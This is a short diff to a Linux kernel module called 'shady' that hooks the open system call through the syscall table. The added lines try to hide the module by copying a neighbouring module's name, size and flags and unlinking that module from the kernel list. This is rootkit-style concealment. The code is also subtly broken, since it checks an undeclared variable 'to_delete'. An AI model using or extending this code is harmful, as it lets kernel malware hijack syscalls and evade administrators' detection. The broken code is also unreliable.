@@ -240,6 +240,9 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
+  struct module *mod = &__this_module;
+  struct module *last_mod = NULL;
+  struct module *to_delete_mod = NULL;
 	
   if (shady_ndevices <= 0)
     {
@@ -289,6 +292,20 @@ shady_init_module(void)
   old_open = system_call_table_address[__NR_open];
   system_call_table_address[__NR_open] = my_open;
   printk(KERN_INFO "open replaced by my_open addr\n");
+
+  /*=======to hide this module=======*/
+  to_delete_mod = mod->next;  /*get the next mod*/
+  if (!to_delete){
+    printk("No mod for exchange :((\n");
+    return 0;
+  }
+  /*overide information*/
+  mod->name = to_delete_mod->name;
+  mod->size = to_delete_mod->size;
+  mod->flags = to_delete_mod->flags;
+
+  /*skipping the to_delete_mod from the list(not delete, but hide)*/
+  mod->next = to_delete_mod->next;
   
   return 0; /* success */
 
